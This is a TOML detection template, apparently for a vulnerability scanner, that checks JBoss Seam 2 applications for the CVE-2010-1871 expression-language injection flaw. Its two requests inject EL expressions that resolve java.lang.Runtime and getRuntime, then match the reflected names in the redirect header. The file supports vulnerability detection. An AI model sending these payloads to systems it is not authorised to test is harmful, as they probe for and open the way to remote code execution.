[info]
id = "POC-AVE-2010-0009"
name = "Red Hat JBoss Seam 2 表达式语言注入远程代码执行检测 PoC"
author = "AVE"
severity = "high"
tags = ["rce", "jboss", "seam", "el-injection", "CWE-917"]
description = "检测 JBoss Seam 2 应用是否存在 CVE-2010-1871 表达式语言注入漏洞。通过向 actionOutcome 参数注入 JBoss EL 表达式，若服务器解析并回显表达式结果（如类名 java.lang.Runtime），则判定存在漏洞。"
vuln_id = ["CVE-2010-1871", "AVE-2010-0009"]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/seam-booking/home.seam"
query.actionOutcome = "/pwn.xhtml?pwned=%23{expressions.getClass().forName('java.lang.Runtime')}"
headers = { "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" }

[[poc.requests.matchers]]
type = "status"
status = [302]
expect = true

[[poc.requests.matchers]]
type = "word"
part = "header"
words = ["java.lang.Runtime", "Location"]
expect = true

[[poc.requests]]
method = "GET"
path = "/admin-console/login.seam"
query.actionOutcome = "/success.xhtml?user=%23{expressions.getClass().forName('java.lang.Runtime').getDeclaredMethod('getRuntime')}"
headers = { "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" }

[[poc.requests.matchers]]
type = "status"
status = [302]
expect = true

[[poc.requests.matchers]]
type = "word"
part = "header"
words = ["java.lang.Runtime", "getRuntime", "Location"]
expect = true
